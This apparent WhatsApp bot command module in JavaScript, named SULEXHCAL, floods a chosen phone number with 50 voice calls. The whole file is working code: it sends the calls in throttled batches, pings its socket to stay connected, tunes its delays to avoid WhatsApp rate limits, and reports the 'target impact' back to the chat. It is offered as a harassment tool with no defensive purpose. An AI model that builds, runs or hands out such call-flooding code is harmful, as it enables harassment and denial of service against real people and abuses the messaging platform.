const { channelInfo } = require('../lib/messageConfig');

/**
 * Enhanced SULEXHCAL Command with Anti-Disconnect Protection
 * Sends 50 calls with intelligent throttling and socket keep-alive
 * Prevents socket disconnection and maintains bot stability
 * SAME LOGIC AS SULEXH.JS BUT FOR CALLS
 */
async function sulexhcalCommand(sock, chatId, targetNumber, message) {
    try {
        console.log("🚀 SULEXHCAL CALL FLOOD INITIATED - Preparing 50 calls");

        // Validate socket connection before starting
        if (!sock || !sock.ws || !sock.ws.socket || sock.ws.socket.readyState !== 1) {
            throw new Error("Socket connection not ready for call flood");
        }

        // Clean and validate target number
        let target = targetNumber.replace(/[^0-9+]/g, '');
        if (target.length < 10) {
            throw new Error("Invalid target number - must be at least 10 digits");
        }

        // Ensure proper JID format
        const targetJid = target.includes('@') 
            ? target 
            : target.replace(/[^\d]/g, '') + '@s.whatsapp.net';

        // CRITICAL: Enhanced configuration with proper throttling to prevent socket death
        // SAME PATTERN AS SULEXH.JS
        const TOTAL_CALLS = 50;
        const BATCH_SIZE = 5; // REDUCED from 50 to prevent overwhelming the socket
        const BATCH_DELAY = 1000; // INCREASED - this is critical!
        const RETRY_ATTEMPTS = 1; // Reduced from 2 to avoid re-attempts that stress socket
        const HEARTBEAT_INTERVAL = 5000; // Send ping every 5 seconds to keep socket alive
        
        let successfulCalls = 0;
        let failedCalls = 0;
        let totalBatches = Math.ceil(TOTAL_CALLS / BATCH_SIZE);
        let floodAborted = false;

        console.log(`📊 Flood Configuration:
        - Total Calls: ${TOTAL_CALLS}
        - Batch Size: ${BATCH_SIZE}
        - Total Batches: ${totalBatches}
        - Batch Delay: ${BATCH_DELAY}ms (CRITICAL for socket stability)
        - Heartbeat: Every ${HEARTBEAT_INTERVAL}ms
        - Anti-Disconnect: ENABLED`);

        const startTime = Date.now();

        // Send initial confirmation to avoid confusion
        await sock.sendMessage(chatId, {
            text: `🚀 SULEXHCAL CALL FLOOD INITIATED\n` +
                  `🎯 Target: ${targetJid}\n` +
                  `📞 Total Calls: ${TOTAL_CALLS}\n` +
                  `⚡ Mode: Throttled Batch Processing\n` +
                  `🛡️ Anti-Disconnect: ENABLED\n` +
                  `💓 Socket Keep-Alive: ACTIVE\n\n` +
                  `💥 FLOOD STARTING IN 3 SECONDS...`,
            ...channelInfo
        }, { quoted: message });

        // Brief pause for preparation
        await new Promise(resolve => setTimeout(resolve, 3000));

        // START: Socket keep-alive heartbeat thread
        let heartbeatCounter = 0;
        const heartbeatInterval = setInterval(() => {
            try {
                if (sock?.ws?.socket && sock.ws.socket.readyState === 1) {
                    sock.ws.socket.ping(); // Send ping to maintain connection
                    heartbeatCounter++;
                }
            } catch (error) {
                console.log(`⚠️ Heartbeat error:`, error.message);
            }
        }, HEARTBEAT_INTERVAL);

        // Execute flood in intelligent batches with proper throttling
        for (let batchIndex = 0; batchIndex < totalBatches; batchIndex++) {
            
            // CRITICAL: Check socket health before each batch
            if (!sock.ws || !sock.ws.socket || sock.ws.socket.readyState !== 1) {
                console.log("🚨 Socket connection lost - aborting flood");
                floodAborted = true;
                failedCalls += (TOTAL_CALLS - (batchIndex * BATCH_SIZE));
                break;
            }

            const batchStart = batchIndex * BATCH_SIZE;
            const batchEnd = Math.min(batchStart + BATCH_SIZE, TOTAL_CALLS);
            const batchCalls = [];

            console.log(`📦 Processing batch ${batchIndex + 1}/${totalBatches} (Calls ${batchStart + 1}-${batchEnd})`);

            // Create batch of call promises with sequential timing
            for (let i = batchStart; i < batchEnd; i++) {
                const callPromise = makeCallFlood(sock, targetJid, i + 1, RETRY_ATTEMPTS);
                batchCalls.push(callPromise);
            }

            // Execute batch with error handling
            try {
                const batchResults = await Promise.allSettled(batchCalls);
                
                // Process batch results
                batchResults.forEach((result, index) => {
                    if (result.status === 'fulfilled' && result.value.success) {
                        successfulCalls++;
                    } else {
                        failedCalls++;
                        console.log(`❌ Call ${batchStart + index + 1} failed:`, 
                                  result.reason?.message || result.value?.error || 'Unknown error');
                    }
                });

                // CRITICAL: Delay between batches - DO NOT REDUCE THIS!
                // This prevents WhatsApp rate limiting and socket overflow
                if (batchIndex < totalBatches - 1) {
                    console.log(`⏳ Waiting ${BATCH_DELAY}ms before next batch...`);
                    await new Promise(resolve => setTimeout(resolve, BATCH_DELAY));
                }

                // Progress update every 5 batches to avoid log spam
                if ((batchIndex + 1) % 5 === 0) {
                    const elapsed = Date.now() - startTime;
                    const rate = (successfulCalls / (elapsed / 1000)).toFixed(2);
                    console.log(`📊 Progress: ${batchIndex + 1}/${totalBatches} batches | Rate: ${rate} calls/s`);
                }

            } catch (batchError) {
                console.error(`💥 Batch ${batchIndex + 1} critical error:`, batchError.message);
                failedCalls += batchCalls.length;
                
                // Continue with next batch instead of stopping
                await new Promise(resolve => setTimeout(resolve, BATCH_DELAY + 500));
                continue;
            }
        }

        // STOP: Heartbeat thread
        clearInterval(heartbeatInterval);
        console.log(`💓 Heartbeat stopped (${heartbeatCounter} pings sent)`);

        const endTime = Date.now();
        const totalTime = endTime - startTime;
        const callsPerSecond = (successfulCalls / (totalTime / 1000)).toFixed(2);

        console.log(`🎯 SULEXHCAL FLOOD COMPLETED:
        - Successful: ${successfulCalls}/${TOTAL_CALLS}
        - Failed: ${failedCalls}/${TOTAL_CALLS}
        - Aborted: ${floodAborted ? 'YES' : 'NO'}
        - Duration: ${totalTime}ms (${(totalTime/1000).toFixed(2)}s)
        - Speed: ${callsPerSecond} calls/sec
        - Heartbeats: ${heartbeatCounter}`);

        // Send detailed completion report
        const completionReport = `
📞📞📞 SULEXHCAL MEGA FLOOD COMPLETED! 📞📞📞

📊 DETAILED STATISTICS:
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ 🎯 Target: ${targetJid}
┃ ✅ Successful: ${successfulCalls}/${TOTAL_CALLS}
┃ ❌ Failed: ${failedCalls}/${TOTAL_CALLS}
┃ 📈 Success Rate: ${((successfulCalls/TOTAL_CALLS)*100).toFixed(1)}%
┃ ⏱️ Total Duration: ${(totalTime/1000).toFixed(2)} seconds
┃ ⚡ Speed: ${callsPerSecond} calls/second
┃ 📦 Batches Processed: ${totalBatches}
┃ 💓 Keep-Alive Pings: ${heartbeatCounter}
┃ 🛑 Aborted: ${floodAborted ? 'YES ⚠️' : 'NO ✅'}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

🚀 EXECUTION MODE: Enhanced Anti-Disconnect with Keep-Alive
🛡️ SOCKET PROTECTION: Active & Maintained
💣 FLOOD INTENSITY: Optimized for Stability
⚡ BATCH PROCESSING: Throttled (${BATCH_DELAY}ms delays)

🎯 TARGET IMPACT: ${successfulCalls} CALLS DELIVERED!
        `;

        await sock.sendMessage(chatId, {
            text: completionReport,
            ...channelInfo
        }, { quoted: message });

        return {
            success: !floodAborted,
            totalSent: successfulCalls,
            totalFailed: failedCalls,
            duration: totalTime,
            aborted: floodAborted
        };

    } catch (criticalError) {
        console.error("🚨 CRITICAL SULEXHCAL COMMAND FAILURE:", criticalError);

        // Emergency error notification with fallback
        try {
            await sock.sendMessage(chatId, {
                text: `🚨📞 SULEXHCAL FLOOD SYSTEM CRITICAL ERROR 📞🚨\n\n` +
                      `❌ Error: ${criticalError.message || 'Unknown system error'}\n` +
                      `🛡️ Bot Protection: Active (Preventing disconnect)\n` +
                      `🔄 System Status: Recovering\n\n` +
                      `💡 The bot is stabilizing. Please wait a few moments before trying again.`,
                ...channelInfo
            }, { quoted: message });
        } catch (notificationError) {
            console.error("💥 Failed to send error notification:", notificationError.message);
        }

        return {
            success: false,
            error: criticalError.message,
            totalSent: 0,
            totalFailed: 50,
            aborted: true
        };
    }
}

/**
 * Enhanced call sending with retry logic and socket health checks
 * SAME LOGIC AS sendFloodMessage BUT FOR CALLS
 * @param {Object} sock - WhatsApp socket instance
 * @param {string} targetJid - Target JID
 * @param {number} callIndex - Call number for tracking
 * @param {number} retryAttempts - Number of retry attempts
 * @returns {Promise} Call send result
 */
async function makeCallFlood(sock, targetJid, callIndex, retryAttempts = 1) {
    for (let attempt = 0; attempt <= retryAttempts; attempt++) {
        try {
            // Verify socket health before each call
            if (!sock.ws || !sock.ws.socket || sock.ws.socket.readyState !== 1) {
                throw new Error(`Socket not ready (attempt ${attempt + 1})`);
            }

            // Make the call with error handling
            const callResult = await sock.call(targetJid, {
                isVideo: false,
                isGroup: false
            }).catch(err => {
                throw new Error(`Call failed: ${err.message}`);
            });

            return {
                success: true,
                callIndex: callIndex,
                attempt: attempt + 1,
                callId: callResult?.key?.id
            };

        } catch (error) {
            console.log(`⚠️ Call ${callIndex} attempt ${attempt + 1} failed: ${error.message}`);
            
            // If this was the last attempt, return failure
            if (attempt === retryAttempts) {
                return {
                    success: false,
                    callIndex: callIndex,
                    error: error.message,
                    finalAttempt: attempt + 1
                };
            }

            // Minimal delay before retry
            if (attempt < retryAttempts) {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
    }
}

/**
 * Socket health check utility
 * @param {Object} sock - WhatsApp socket instance
 * @returns {boolean} Socket health status
 */
function isSocketHealthy(sock) {
    try {
        return sock && 
               sock.ws && 
               sock.ws.socket && 
               sock.ws.socket.readyState === 1;
    } catch (error) {
        return false;
    }
}

module.exports = sulexhcalCommand;
